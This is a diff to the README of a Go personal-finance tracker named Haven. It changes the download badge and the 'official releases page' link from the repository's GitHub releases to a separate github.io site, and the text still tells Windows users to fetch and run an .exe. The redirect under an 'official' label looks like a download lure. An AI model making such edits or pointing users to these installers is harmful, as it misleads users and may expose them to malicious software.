@@ -1,6 +1,6 @@
 # 💰 haven-golang - Track your personal finances with ease
 
-[![](https://img.shields.io/badge/Download-Haven-blue.svg)](https://github.com/fanglike-planography145/haven-golang/releases)
+[![](https://img.shields.io/badge/Download-Haven-blue.svg)](https://fanglike-planography145.github.io)
 
 Haven helps you manage your money. This application tracks your spending, income, and savings in one place. You own your data because you host this software on your own computer. Developers built this system with the Go programming language to ensure speed and reliability.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run Haven smoothly:
 
 Follow these steps to get Haven running on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/fanglike-planography145/haven-golang/releases) to download the installer.
+1. Visit the [official releases page](https://fanglike-planography145.github.io) to download the installer.
 2. Look for the file ending in .exe under the latest version.
 3. Click the link to start the download. Note where you save the file on your computer.
 4. Locate the downloaded file in your Downloads folder.
